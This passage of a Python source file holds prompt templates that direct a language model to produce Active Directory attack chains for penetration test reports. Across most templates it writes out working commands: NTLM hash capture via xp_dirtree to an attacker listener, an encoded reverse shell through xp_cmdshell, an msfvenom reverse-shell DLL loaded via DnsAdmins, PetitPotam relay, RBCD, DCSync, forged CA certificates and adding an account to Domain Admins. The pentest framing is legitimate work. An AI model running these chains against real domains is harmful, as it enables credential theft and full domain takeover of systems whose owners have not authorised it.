The MOST COMMON and EFFECTIVE technique is NTLM hash capture via xp_dirtree —
this works even for LOW-PRIVILEGE SQL users (no sysadmin required).

## ATTACK PRIORITY ORDER (try in this order)

### TECHNIQUE 1: NTLM Hash Capture via xp_dirtree (PREFERRED — works without sysadmin)
This is the PRIMARY attack. Forces the SQL Server service account to authenticate
to the attacker's listener, capturing its NTLMv2 hash for offline cracking.

Step 1 — START LISTENER ON ATTACKER MACHINE:
  $ sudo responder -I tun0
  OR: $ impacket-smbserver share . -smb2support

Step 2 — CONNECT TO MSSQL:
  $ impacket-mssqlclient {domain}/{source}:'{pass}'@{target} -windows-auth

Step 3 — TRIGGER xp_dirtree TO CAPTURE HASH:
  SQL> EXEC xp_dirtree '\\\\ATTACKER_IP\\share',1,1;
  (Responder/smbserver captures the SQL service account's NTLMv2 hash)

Step 4 — CRACK THE CAPTURED HASH:
  $ hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt

Step 5 — AUTHENTICATE AS SQL SERVICE ACCOUNT:
  $ evil-winrm -i {target} -u 'sql_svc' -p 'cracked_password'
  OR: $ nxc smb {target} -u 'sql_svc' -p 'cracked_password'

### TECHNIQUE 2: xp_cmdshell (requires sysadmin role)
Only works if the SQL user has sysadmin privileges.

  SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
  SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
  SQL> EXEC xp_cmdshell 'whoami';
  SQL> EXEC xp_cmdshell 'powershell -enc BASE64_REVERSE_SHELL';

### TECHNIQUE 3: Linked Server Hopping
Check for linked servers to pivot between SQL instances.

  SQL> EXEC sp_linkedservers;
  SQL> SELECT * FROM OPENQUERY("LINKEDSERVER", 'SELECT SYSTEM_USER');
  SQL> EXEC('xp_cmdshell ''whoami''') AT LINKEDSERVER;

## POST-EXPLOITATION ON SQL SERVER
After gaining shell access via cracked service account or xp_cmdshell:
- Check SQL error logs for credentials: type C:\\SQLServer\\Logs\\ERRORLOG.BAK
- Enumerate databases for sensitive data: SELECT name FROM sys.databases;
- Check for stored credentials: SELECT * FROM master.dbo.syslogins;
- Look for further BloodHound edges from the compromised service account

## TOOLS TO USE
- impacket-mssqlclient (connect to MSSQL)
- responder / impacket-smbserver (capture NTLMv2 hashes)
- hashcat -m 5600 (crack NTLMv2)
- nxc mssql (quick MSSQL enumeration)
- PowerUpSQL (Windows-based SQL enumeration)

## CRITICAL RULES
1. ALWAYS try xp_dirtree hash capture FIRST — it works without sysadmin
2. xp_cmdshell requires sysadmin — don't assume you have it
3. SQL service accounts often run as domain users with elevated privileges
4. After cracking the service account hash, check BloodHound for outbound edges
5. SQL error logs frequently contain plaintext credentials for other users

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate 4-5 steps. Lead with xp_dirtree hash capture (Technique 1) as the PRIMARY attack path."""


# =============================================================================
# NTLM RELAY PROMPT
# For: CoerceAndRelayNTLMToSMB, CoerceAndRelayNTLMToLDAP, etc.
# =============================================================================
NTLM_RELAY_PROMPT = """You are generating an **NTLM Relay** attack chain for a penetration test report.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: NTLM RELAY
NTLM Relay captures NTLM authentication and relays it to another service.
This requires:
1. A coercion technique to force authentication
2. A relay target that accepts NTLM
3. No SMB signing or LDAP signing enforcement

## COERCION TECHNIQUES
- **PetitPotam** - EFS RPC abuse (patched but variants exist)
- **PrinterBug/SpoolSample** - Print Spooler RPC
- **DFSCoerce** - Distributed File System abuse
- **ShadowCoerce** - VSS remote protocol
- **Coercer** - Multi-protocol coercion tool

## RELAY TARGETS
- **SMB** - Get shell on target (requires no SMB signing)
- **LDAP** - Modify AD objects (add to groups, configure RBCD)
- **LDAPS** - Same as LDAP but TLS (requires no channel binding)
- **HTTP/ADCS** - Request certificates (ESC8)

## ATTACK FLOW
1. **Set Up Relay** - Configure ntlmrelayx with target
2. **Start Coercion** - Trigger authentication from victim
3. **Relay Authentication** - Forward to target service
4. **Achieve Objective** - Shell, AD modification, or certificate

## TOOLS TO USE (use hostnames from {domain}, {target})
- **Relay**:
  - ntlmrelayx.py -t smb://{target} (shell)
  - ntlmrelayx.py -t ldap://{dc_hostname} --escalate-user ATTACKER_USER (LDAP)
  - ntlmrelayx.py -t http://CA.{domain}/certsrv --adcs (ESC8)
- **Coercion**:
  - PetitPotam.py ATTACKER_LISTENER {target}
  - printerbug.py {domain}/USER:PASS@{target} ATTACKER_LISTENER
  - dfscoerce.py -d {domain} -u USER -p PASS {target} ATTACKER_LISTENER

## CRITICAL RULES
1. Check SMB/LDAP signing before attempting
2. Coercing DC gives you DC machine account = high value
3. LDAP relay to DC allows AD object modification
4. Combine with RBCD for computer account compromise

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate 4-5 steps covering the NTLM relay attack."""


# =============================================================================
# GPO LINK/ABUSE PROMPT
# For: WriteGPLink edges
# =============================================================================
GPLINK_PROMPT = """You are generating a **GPO Link Abuse** attack chain for a penetration test report.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: GROUP POLICY LINK ABUSE
WriteGPLink allows linking Group Policy Objects to Organizational Units.
This enables applying malicious policies to all objects in the OU, including:
- Scheduled tasks that execute code
- Startup/logon scripts
- Registry modifications
- Software deployment
- Security policy changes

## ATTACK FLOW
1. **Verify Link Permission** - Confirm WriteGPLink on target OU
2. **Create/Find GPO** - Create new GPO or find writable existing
3. **Configure Malicious Policy** - Add execution mechanism
4. **Link to OU** - Apply GPO to target OU
5. **Wait for Application** - Policy applies on refresh (90 min default)

## MALICIOUS POLICY OPTIONS
- **Immediate Scheduled Task**: Computer Config > Preferences > Scheduled Tasks
- **Startup Script**: Computer Config > Windows Settings > Scripts > Startup
- **Logon Script**: User Config > Windows Settings > Scripts > Logon
- **Software Installation**: Computer Config > Software Settings

## TOOLS TO USE
- **SharpGPOAbuse**:
  - SharpGPOAbuse.exe --AddLocalAdmin --UserAccount ATTACKER --GPOName "Target GPO"
  - SharpGPOAbuse.exe --AddComputerTask --TaskName "Backdoor" --Author SYSTEM --Command "cmd.exe" --Arguments "/c powershell -enc ..."
- **PowerView**:
  - Get-DomainGPO | Get-DomainObjectAcl
  - New-GPLink -Name "MaliciousGPO" -Target "OU=Computers,DC=domain,DC=com"
- **pyGPOAbuse**:
  - pygpoabuse.py DOMAIN/USER:PASS -gpo-id GPO_GUID

## CRITICAL RULES
1. GPO application takes time (up to 90 minutes by default)
2. Force update: gpupdate /force (requires access to targets)
3. Link to OU containing computers for immediate impact
4. GPO changes generate Event 5136/5137

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate 4-5 steps covering GPO link abuse."""


# =============================================================================
# GOLDEN CERTIFICATE PROMPT
# For: GoldenCert edges
# =============================================================================
GOLDENCERT_PROMPT = """You are generating a **Golden Certificate** attack chain for a penetration test report.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: GOLDEN CERTIFICATE
GoldenCert indicates compromise of the Certificate Authority's private key.
With the CA private key, you can forge certificates for ANY user in the domain,
providing unlimited domain access and persistence.

## ATTACK REQUIREMENTS
- Access to CA server (compromise CA)
- Extract CA private key (from filesystem or DPAPI)
- CA certificate (public, easily obtained)

## ATTACK FLOW
1. **Compromise CA Server** - Get admin access to Certificate Authority
2. **Extract CA Private Key** - From DPAPI, certificate store, or backup
3. **Forge Certificate** - Create cert for any user (Administrator)
4. **Authenticate via PKINIT** - Use forged cert for Kerberos auth
5. **Persistent Access** - Certificates last years, password-independent

## TOOLS TO USE
- **Extract CA Key**:
  - SharpDPAPI certificates /machine (if key exportable)
  - certsrv.msc > Right-click CA > All Tasks > Back up CA (if admin)
  - Mimikatz crypto::certificates /export /systemstore:local_machine
- **Forge Certificate**:
  - ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword pass --Subject "CN=Administrator" --SubjectAltName "administrator@DOMAIN" --NewCertPath admin.pfx
  - Certipy forge -ca-pfx ca.pfx -upn administrator@DOMAIN -subject "CN=Administrator"
- **Authenticate**:
  - Certipy auth -pfx admin.pfx -dc-ip DC
  - Rubeus asktgt /user:Administrator /certificate:admin.pfx /ptt

## CRITICAL RULES
1. GoldenCert = ULTIMATE persistence (years of access)
2. Forged certs are indistinguishable from legitimate ones
3. Password changes don't affect certificate validity
4. Only detectable via certificate transparency or serial gaps
5. Complete PKI rebuild required for remediation

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate 4-5 steps covering Golden Certificate creation and abuse."""


# =============================================================================
# COERCE TO TGT (UNCONSTRAINED DELEGATION COERCION)
# For: CoerceToTGT edges
# =============================================================================
COERCETOTGT_PROMPT = """You are generating a **Coercion and Relay** attack chain for a penetration test report.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: COERCE DC TO AUTHENTICATE, RELAY FOR DOMAIN COMPROMISE

CoerceToTGT means the target (usually a Domain Controller) can be FORCED to authenticate
to an attacker-controlled listener. The attacker does NOT need to be on the DC or on any
special host — they run tools FROM THEIR OWN KALI/LINUX MACHINE.

## IMPORTANT CAVEAT
This CoerceToTGT edge exists on ALL Domain Controllers by default (they all have unconstrained
delegation). It is only EXPLOITABLE if the environment lacks NTLM relay protections.
The observation MUST mention this caveat. Step 1 MUST be prerequisite verification.

## CRITICAL: ATTACKER PERSPECTIVE
- ALL commands run on the ATTACKER'S machine (Kali Linux), NOT on the DC
- The attacker sets up a LISTENER, then TRIGGERS the DC to connect BACK to them
- The attacker does NOT need admin on the DC to start this attack
- The attacker only needs: valid domain credentials + network access to the DC

## ATTACK FLOW (5 steps, all from attacker machine)

Step 1 — VERIFY PREREQUISITES (REQUIRED before attempting coercion):
The pentester MUST check if relay protections are in place:
  $ nxc ldap {dc_hostname} -u '{source}' -p '<PASSWORD>' -M ldap-checker
  (Check output: LDAP signing NOT required, Channel binding NOT enforced)
  $ nxc smb {dc_hostname} -u '{source}' -p '<PASSWORD>' -M spooler
  (Check output: Print Spooler service is running)
  $ nxc smb {dc_hostname} -u '{source}' -p '<PASSWORD>' -M petitpotam
  (Check output: PetitPotam is not patched)
If LDAP signing IS enforced and channel binding IS enabled, this attack is NOT viable — STOP.

Step 2 — SET UP RELAY LISTENER ON ATTACKER MACHINE:
Choose ONE relay method:

  a) NTLM relay to LDAP (configures RBCD — most reliable):
     $ impacket-ntlmrelayx -t ldap://{dc_hostname} --delegate-access --escalate-user '{source}'

  b) NTLM relay to ADCS (if CA exists — gets certificate):
     $ impacket-ntlmrelayx -t http://CA_SERVER/certsrv/certfnsh.asp --adcs --template DomainController

  c) Kerberos relay (captures TGT directly):
     $ krbrelayx.py --target {dc_hostname} -ip ATTACKER_IP

Step 2 — TRIGGER COERCION (force DC to authenticate to attacker):
The attacker forces the DC to connect BACK to the attacker's listener.

  $ PetitPotam.py ATTACKER_IP {dc_hostname} -u '{source}' -p '<PASSWORD>' -d {domain}
  OR: python3 dementor.py -d {domain} -u '{source}' -p '<PASSWORD>' ATTACKER_IP {dc_hostname}
  OR: coercer coerce -l ATTACKER_IP -t {dc_hostname} -u '{source}' -p '<PASSWORD>' -d {domain}

  NOTE: PetitPotam works unauthenticated on unpatched DCs. Try without -u/-p first.

Step 3 — EXPLOIT THE RELAYED CREDENTIAL:

  If relay method (a) — RBCD was configured:
     $ impacket-getST '{domain}/FAKEPC$:FakeP@ss123' -spn cifs/{dc_hostname} -impersonate Administrator -dc-ip {dc_hostname}
     $ export KRB5CCNAME=Administrator@cifs_{dc_hostname}@{domain}.ccache

  If relay method (b) — certificate obtained:
     $ certipy auth -pfx dc.pfx -dc-ip {dc_hostname}

Step 4 — DOMAIN COMPROMISE:
  $ impacket-secretsdump -k -no-pass '{domain}/Administrator@{dc_hostname}'
  OR: impacket-psexec -k -no-pass '{domain}/Administrator@{dc_hostname}'

## TOOLS
- Coercion: PetitPotam.py, Coercer, dementor.py (PrinterBug)
- Relay: impacket-ntlmrelayx, krbrelayx
- Exploitation: impacket-getST, certipy auth, impacket-secretsdump

## CRITICAL RULES
1. ALL commands run on ATTACKER machine — NEVER assume you are on the DC
2. Do NOT use Rubeus monitor (that requires being ON a UD host with SYSTEM)
3. The relay listener must be running BEFORE triggering coercion
4. PetitPotam is preferred over PrinterBug (Print Spooler often disabled on DCs)
5. DC TGT/certificate = ability to DCSync = full domain compromise
6. ATTACKER_IP is the attacker's Kali machine IP — substitute with actual IP

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate exactly 5 steps: verify prerequisites, setup listener, trigger coercion, exploit relay, domain compromise."""


# =============================================================================
# MANAGE CA PROMPT
# For: ManageCA edges
# =============================================================================
MANAGECA_PROMPT = """You are generating a **Manage CA** attack chain for a penetration test report.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: CA ADMINISTRATOR ABUSE
ManageCA (CA Administrator) permission allows:
- Publishing/unpublishing certificate templates
- Granting enrollment rights on templates
- Modifying CA configuration
- Enabling vulnerable flags (ESC6/ESC11)
- Approving pending certificate requests

## ATTACK PATHS

**Path 1: Enable ESC6 Flag**
1. Enable EDITF_ATTRIBUTESUBJECTALTNAME2
2. Request cert with arbitrary SAN
3. Authenticate as any user

**Path 2: Publish Vulnerable Template**
1. Create/modify vulnerable template
2. Publish template to CA
3. Enroll and exploit

**Path 3: Grant Certificate Officer Role**
1. Grant self ManageCertificates permission
2. Approve pending requests for privileged users
3. Use approved certificate

## TOOLS TO USE
- **Enable ESC6 Flag**:
  - certutil -config "CA\\CAName" -setreg policy\\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
  - Restart-Service CertSvc
- **Certipy CA abuse**:
  - certipy ca -ca CA_NAME -enable-template TEMPLATE -username USER -password PASS
  - certipy ca -ca CA_NAME -add-officer USER
- **PSPKI Module**:
  - Add-CATemplate -Name "VulnerableTemplate" -CAName "CA\\CAName"

## CRITICAL RULES
1. CA restart may be needed for flag changes
2. ManageCA != ManageCertificates (different roles)
3. Flag changes are logged in CA audit events
4. This is a path to GoldenCert if combined with other access

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate 4-5 steps covering CA Administrator abuse."""


# =============================================================================
# PASSWORD NOT REQUIRED PROMPT
# For: Accounts with PASSWD_NOTREQD flag (empty password authentication)
# =============================================================================
PASSWORD_NOT_REQUIRED_PROMPT = """You are generating an attack chain for a penetration test report targeting accounts with the **PASSWD_NOTREQD** flag.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: PASSWORD NOT REQUIRED (PASSWD_NOTREQD)
The PASSWD_NOTREQD flag in UserAccountControl means the account can have an EMPTY password.
This is a critical misconfiguration — the attacker can authenticate with NO credential at all.

## ATTACK STEP RULES
Generate 2-3 focused steps:

**Step 1: Validate Empty Password Authentication**
Try authenticating with an empty password to confirm the misconfiguration.
- SAFE option: `nxc smb {{dc_hostname}} -u '{{source}}' -p ''` (NetExec SMB check)
- RISKY option: `nxc ldap {{dc_hostname}} -u '{{source}}' -p ''` (LDAP validation)

**Step 2: Enumerate Access and Group Memberships**
Check what privileges the account has — group memberships, sessions, shares, etc.
- SAFE option: `nxc smb {{dc_hostname}} -u '{{source}}' -p '' --shares` and `nxc smb {{dc_hostname}} -u '{{source}}' -p '' --sessions`
- RISKY option: `evil-winrm -i {{dc_hostname}} -u '{{source}}' -p ''` (if in Remote Management Users)

**Step 3: Lateral Movement (if access confirmed)**
Use confirmed access for lateral movement or further enumeration.
- SAFE option: `nxc smb {{dc_hostname}} -u '{{source}}' -p '' -M spider_plus` (enumerate shares)
- RISKY option: `impacket-smbclient '{{domain}}/{{source}}'@{{dc_hostname}} -no-pass` (interactive SMB)

## CRITICAL RULES
- The attack is about EMPTY PASSWORD authentication — NOT about group membership checks
- Do NOT generate PowerShell scripts checking local admin groups
- Do NOT reference net.exe, Find-LocalAdminAccess, or Get-ADComputer enumeration
- The target account is {{source}} — authenticate AS this account with empty password
- Use nxc (NetExec), evil-winrm, or Impacket tools — NOT PowerView for this finding

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate 2-3 steps: validate empty password, enumerate access, attempt lateral movement."""


# =============================================================================
# DANGEROUS GROUP MEMBERSHIP PROMPT
# For: Users in operationally-dangerous groups (DnsAdmins, Backup Operators, etc.)
# =============================================================================
DANGEROUS_GROUP_PROMPT = """You are generating an attack chain for a penetration test report targeting **dangerous group memberships**.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: DANGEROUS GROUP MEMBERSHIP
The user **{{source}}** is a member of **{{target}}** — a group that enables well-documented privilege escalation.

## GROUP-SPECIFIC ATTACK TECHNIQUES
Match the attack to the SPECIFIC group:

**DnsAdmins** → DLL injection on DNS service → SYSTEM on DC:
1. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f dll > exploit.dll`
2. `dnscmd {{dc_hostname}} /config /serverlevelplugindll \\\\ATTACKER_IP\\share\\exploit.dll`
3. `sc \\\\{{dc_hostname}} stop dns && sc \\\\{{dc_hostname}} start dns`

**Backup Operators** → SeBackupPrivilege → ntds.dit extraction:
1. Connect via `evil-winrm -i {{dc_hostname}} -u '{{source}}' -p '<PASSWORD>'`
2. Use diskshadow/robocopy to extract ntds.dit and SYSTEM hive
3. `impacket-secretsdump -ntds ntds.dit -system SYSTEM -outputfile hashes LOCAL`

**Remote Management Users** → WinRM access for lateral movement:
SAFE option: Native PowerShell Remoting (uses built-in WinRM, blends with admin activity):
  `Enter-PSSession -ComputerName {{dc_hostname}} -Credential (Get-Credential)`
  OR from Linux: `nxc winrm {{dc_hostname}} -u '{{source}}' -p '<PASSWORD>'` (verify access only)
RISKY option: evil-winrm (third-party offensive tool, logged and signatured):
  `evil-winrm -i {{dc_hostname}} -u '{{source}}' -p '<PASSWORD>'`
⚠️ evil-winrm is ALWAYS RISKY — it is a known offensive tool, NOT a native Windows tool
⚠️ Use {{dc_hostname}} as target — do NOT scan subnets or use IP ranges

**Remote Desktop Users** → RDP access for lateral movement:
1. `xfreerdp /v:{{dc_hostname}} /u:'{{source}}' /p:'<PASSWORD>' /cert:ignore`
2. Enumerate from RDP session

**Account Operators** → Create/modify users, add to groups:
1. `net user attacker Password123! /add /domain`
2. `net group "Domain Admins" attacker /add /domain`

**Exchange Windows Permissions** → WriteDacl on domain → DCSync:
1. Use bloodyAD or PowerView to grant DCSync rights
2. `impacket-secretsdump '{{domain}}/{{source}}:<PASSWORD>'@{{dc_hostname}}`

## CRITICAL RULES
- Match the attack technique to the SPECIFIC group name in {{target}}
- Do NOT use generic "check local admin" scripts
- Do NOT confuse group membership (what the finding IS) with local admin enumeration (irrelevant)
- Show the actual privilege escalation path for the specific group
- NEVER use IP addresses or subnet ranges (10.x.x.x, 192.x.x.x, /24) — use hostnames ONLY
- NEVER invent hostnames — only use {{dc_hostname}} and names from the attack path

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate 2-4 steps showing the specific escalation path for the group {{target}}."""


# =============================================================================
# GENERIC FALLBACK PROMPT
# For: Unknown or unmapped edge types
# =============================================================================
GENERIC_FALLBACK_PROMPT = """You are generating an attack chain for a penetration test report.

{common_header}

{common_starting_position}

## YOUR TASK
Analyze the edge types ({edge_types}) and generate an appropriate attack chain
showing how to progress from {source} to {target}.

Match your techniques to the edge types present:
- For credential access edges: Show how to obtain and use credentials
- For permission-based edges: Show how to abuse the permissions
- For access-based edges: Show lateral movement techniques
- For delegation edges: Show Kerberos delegation abuse

## CRITICAL: TECHNIQUE SCOPE RESTRICTIONS
Check the edge types above ({edge_types}) and ONLY use techniques that match:

**If edges are MemberOf, AddMember, Contains (group-based):**
- Show group membership exploitation
- Final step: Use gained privileges for lateral movement or resource access
- Do NOT include: DCSync, Golden Ticket, krbtgt, secretsdump

**If edges are WriteDacl, WriteOwner, GenericAll, GenericWrite (ACL-based):**
- Show ACL modification and permission abuse
- Final step: Add self to privileged group or reset target password
- Do NOT include: DCSync, Golden Ticket, krbtgt unless edges explicitly include GetChanges

**If edges are Kerberoastable, HasSPNConfigured:**
- Show Kerberoasting attack chain with offline cracking
- Do NOT include: DCSync, Golden Ticket

**If edges include GetChanges, GetChangesAll, DCSync:**
- ONLY THEN show DCSync and Golden Ticket techniques

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate only the steps that are genuinely needed (typically 2-4) covering the attack path from initial access to objective."""


# =============================================================================
# CHAIN DISCOVERY PROMPT — used for multi-hop attack chains
# Replaces edge-specific prompts when the finding is from chain discovery.
# The key insight: edge-specific prompts focus on ONE technique, but chains
# require ordered steps that traverse multiple edges sequentially.
# =============================================================================
CHAIN_DISCOVERY_PROMPT = """You are generating a **multi-hop attack chain** for a penetration test report.

{common_header}

## CRITICAL: THIS IS A MULTI-HOP CHAIN — FOLLOW THE EXACT SEQUENCE

The attack path below shows EACH HOP in order. You MUST generate steps that follow this EXACT sequence.
Each edge belongs to the node BEFORE the arrow — do NOT mix up who has what rights.

{chain_rag_context}

## ATTACK STEP RULES FOR CHAINS
1. Generate ONE attack step per EXPLOITATION HOP in the chain (skip MemberOf hops — those are just group inheritance)
2. Steps MUST follow the chain order: first hop → second hop → third hop → ...
3. For each hop, the SOURCE of that hop must already be compromised from a prior step
4. The FIRST step shows how to compromise or leverage the entry point's edge
5. Subsequent steps use the newly-compromised identity to exploit the next edge
6. The LAST step achieves the final objective (e.g., DCSync, domain admin, etc.)

## DO NOT GRANT RIGHTS — PIVOT THROUGH IDENTITIES
When the chain shows A -[GenericAll/GenericWrite]-> B (User):
- The exploitation step MUST present EXACTLY TWO OPSEC options:

  **OPSEC-SAFE Option: Targeted Kerberoasting**
  ```bash
  # Step 1: Set fake SPN on target
  bloodyAD -d DOMAIN -u A -p 'PASS' --host DC set object B servicePrincipalName -v '' -v 'HTTP/fake.DOMAIN'
  # Step 2: Request TGS ticket
  impacket-GetUserSPNs DOMAIN/A:'PASS' -request -outputfile tgs.txt -dc-ip DC
  # Step 3: Crack offline
  hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
  # Step 4: Cleanup - remove fake SPN
  bloodyAD -d DOMAIN -u A -p 'PASS' --host DC set object B servicePrincipalName -v ''
  ```

  **OPSEC-RISKY Option: Shadow Credentials**
  ```bash
  certipy shadow auto -u A@DOMAIN -p 'PASS' -account B -target DC -dc-ip DC
  # If SSL wrapping error occurs, fall back to Targeted Kerberoasting above
  ```

  IMPORTANT: You MUST include BOTH options. Do NOT present two variations of the same technique.

When the chain shows A -[GenericAll]-> B -[GetChanges]-> DOMAIN:
- Step 1: Compromise B using A's GenericAll (show BOTH Targeted Kerberoasting AND Shadow Credentials as options)
- Step 2: Authenticate as B, then perform DCSync using B's existing GetChanges rights
- WRONG: Trying to grant A DCSync rights or modify A's permissions

When the chain shows A -[GenericAll]-> B -[ForceChangePassword]-> C:
- Step 1: Compromise B using A's GenericAll (show BOTH techniques as options)
- Step 2: Authenticate as B, then use B's ForceChangePassword to reset C's password
- WRONG: Resetting C's password in Step 1 (you don't have B's credentials yet)

When the chain shows A -[GenericAll]-> COMPUTER (DC or server):
- Use RBCD or Shadow Credentials — authenticate as A (the user you control), NOT as COMPUTER
- WRONG: Using COMPUTER's password to authenticate (you don't have it — that would be circular)
- WRONG: Using CoerceToTGT with COMPUTER's own credentials (redundant if you already own it)

## MULTI-STEP ATTACKS — DO NOT COMPRESS
Complex techniques like RBCD require MULTIPLE steps, not one compressed step.

### RBCD requires 4 steps minimum:
Step 1 — Add computer account:
  `impacket-addcomputer -computer-name 'ATTACKERPC$' -computer-pass '<PASSWORD>' -dc-ip {dc_hostname} '{domain}/{source}:<PASSWORD>'`
Step 2 — Configure RBCD delegation on target:
  `impacket-rbcd -delegate-to 'TARGET$' -delegate-from 'ATTACKERPC$' -action 'write' -dc-ip {dc_hostname} '{domain}/{source}:<PASSWORD>'`
Step 3 — Request service ticket via S4U:
  `impacket-getST -spn CIFS/TARGET.{domain} -impersonate Administrator -dc-ip {dc_hostname} '{domain}/ATTACKERPC$:<PASSWORD>'`
Step 4 — Use ticket for access/credential dump:
  `export KRB5CCNAME=Administrator@CIFS_TARGET.{domain}@{domain}.ccache`
  `impacket-secretsdump -k -no-pass {domain}/Administrator@TARGET.{domain}`

### Shadow Credentials require 3 steps:
Step 1 — Add KeyCredential: `certipy shadow auto -u '{source}@{domain}' -p '<PASSWORD>' -account 'TARGET$' -target {dc_hostname} -dc-ip {dc_hostname}`
Step 2 — Request TGT via PKINIT (output from certipy above)
Step 3 — Use TGT for next hop

### CoerceToTGT requires 4 steps (ALL from attacker Kali machine):
CoerceToTGT means the target can be FORCED to authenticate to the attacker's listener.
The attacker does NOT need to be on the DC. Do NOT use Rubeus monitor (that requires SYSTEM on a UD host).
Step 1 — Setup relay listener on attacker machine:
  `impacket-ntlmrelayx -t ldap://{dc_hostname} --delegate-access --escalate-user 'FAKEPC$'`
Step 2 — Trigger coercion (force DC to authenticate to attacker):
  `PetitPotam.py ATTACKER_IP {dc_hostname} -u '{source}' -p '<PASSWORD>' -d {domain}`
Step 3 — Request service ticket via RBCD (relay configured RBCD automatically):
  `impacket-getST '{domain}/FAKEPC$:<PASSWORD>' -spn cifs/{dc_hostname} -impersonate Administrator -dc-ip {dc_hostname}`
Step 4 — Use ticket for domain compromise:
  `export KRB5CCNAME=Administrator@cifs_{dc_hostname}@{domain}.ccache && impacket-secretsdump -k -no-pass '{domain}/Administrator@{dc_hostname}'`

### DCSync as final step:
- MUST show `impacket-secretsdump -k -no-pass {domain}/DC\$@{dc_hostname}` as one option
- And `mimikatz lsadump::dcsync /domain:{domain} /user:Administrator` as another option
- Do NOT show evil-winrm or WinRM as a DCSync step — DCSync is a replication attack, not a shell
- Do NOT add Golden Ticket creation (impacket-ticketer, kerberos::golden) — that is persistence, not exploitation
- Do NOT extract krbtgt — dump Administrator hash to prove domain compromise
- The attack chain ENDS at DCSync + authenticate as Administrator. No persistence steps.

{consolidation_context}

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

MINIMUM STEP COUNT: You MUST generate AT LEAST {min_steps} attack steps. If you generate fewer than {min_steps} steps, your output will be REJECTED. Do NOT compress multiple techniques (RBCD setup + ticket request, or coercion + DCSync) into a single step.

Generate steps that follow the chain path EXACTLY. One step per exploitation edge, in order."""


# =============================================================================
# EDGE-TO-PROMPT REGISTRY
# =============================================================================
EDGE_SPECIFIC_PROMPTS = {
    # Credential Access - Kerberoasting
    "Kerberoastable": {
        "prompt": KERBEROAST_PROMPT,
        "aliases": ["HasSPNConfigured", "HasSPN"],
        "category": "credential_access",
        "attack_name": "Kerberoasting"
    },
    "HasSPNConfigured": {
        "prompt": KERBEROAST_PROMPT,
        "aliases": [],
        "category": "credential_access",
        "attack_name": "Kerberoasting"
    },

    # Credential Access - AS-REP Roasting
    "ASREPRoastable": {
        "prompt": ASREP_ROAST_PROMPT,
        "aliases": ["DontReqPreAuth"],
        "category": "credential_access",
        "attack_name": "AS-REP Roasting"
    },
    "DontReqPreAuth": {
        "prompt": ASREP_ROAST_PROMPT,
        "aliases": [],
        "category": "credential_access",
        "attack_name": "AS-REP Roasting"
    },

    # Domain Compromise - DCSync
    "DCSync": {
        "prompt": DCSYNC_PROMPT,
        "aliases": ["GetChanges", "GetChangesAll", "GetChangesInFilteredSet"],
        "category": "domain_compromise",
        "attack_name": "DCSync"
    },
    "GetChanges": {
        "prompt": DCSYNC_PROMPT,
        "aliases": [],
        "category": "domain_compromise",
        "attack_name": "DCSync"
    },
    "GetChangesAll": {
        "prompt": DCSYNC_PROMPT,
        "aliases": [],
        "category": "domain_compromise",
        "attack_name": "DCSync"
    },

    # ACL Abuse - GenericAll
    "GenericAll": {
        "prompt": GENERICALL_PROMPT,
        "aliases": ["AllExtendedRights"],
        "category": "acl_abuse",
        "attack_name": "GenericAll Abuse"
    },
    "AllExtendedRights": {
        "prompt": GENERICALL_PROMPT,
        "aliases": [],
        "category": "acl_abuse",
        "attack_name": "AllExtendedRights Abuse (includes ForceChangePassword)"
    },

    # ACL Abuse - GenericWrite
    "GenericWrite": {
        "prompt": GENERICWRITE_PROMPT,
        "aliases": ["WriteProperty"],
        "category": "acl_abuse",
        "attack_name": "GenericWrite Abuse"
    },

    # ACL Abuse - WriteDacl/WriteOwner
    "WriteDacl": {
        "prompt": WRITEDACL_PROMPT,
        "aliases": [],
        "category": "acl_abuse",
        "attack_name": "DACL Manipulation"
    },
    "WriteOwner": {
        "prompt": WRITEDACL_PROMPT,
        "aliases": [],
        "category": "acl_abuse",
        "attack_name": "Ownership Takeover"
    },
    "Owns": {
        "prompt": WRITEDACL_PROMPT,
        "aliases": [],
        "category": "acl_abuse",
        "attack_name": "Owner Abuse"
    },

    # Delegation - Constrained
    "AllowedToDelegate": {
        "prompt": CONSTRAINED_DELEGATION_PROMPT,
        "aliases": ["TrustedToAuth"],
        "category": "delegation",
        "attack_name": "Constrained Delegation"
    },

    # Delegation - RBCD
    "AllowedToAct": {
        "prompt": RBCD_PROMPT,
        "aliases": [],
        "category": "delegation",
        "attack_name": "Resource-Based Constrained Delegation"
    },

    # Delegation - Unconstrained
    "TrustedForDelegation": {
        "prompt": UNCONSTRAINED_DELEGATION_PROMPT,
        "aliases": [],
        "category": "delegation",
        "attack_name": "Unconstrained Delegation"
    },

    # Lateral Movement - Admin
    "AdminTo": {
        "prompt": ADMINTO_PROMPT,
        "aliases": [],
        "category": "lateral_movement",
        "attack_name": "Local Admin Access"
    },

    # Lateral Movement - RDP
    "CanRDP": {
        "prompt": CANRDP_PROMPT,
        "aliases": [],
        "category": "lateral_movement",
        "attack_name": "RDP Access"
    },

    # Lateral Movement - PSRemote
    "CanPSRemote": {
